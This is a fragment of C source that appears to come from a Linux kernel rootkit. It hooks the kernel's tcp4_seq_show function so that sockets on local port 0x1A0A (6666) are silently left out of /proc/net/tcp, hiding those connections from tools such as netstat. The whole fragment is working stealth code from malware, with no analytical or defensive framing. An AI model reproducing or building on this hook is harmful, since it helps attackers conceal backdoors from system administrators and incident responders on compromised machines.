#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long(*og_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long muaddib_tcp4_seq_show(struct seq_file *seq, void *v){
    struct sock *sk = v;
    if(sk != 0x1 && sk->sk_num == 0x1A0A){
        return 0;
    }
    return og_tcp4_seq_show(seq, v);
}
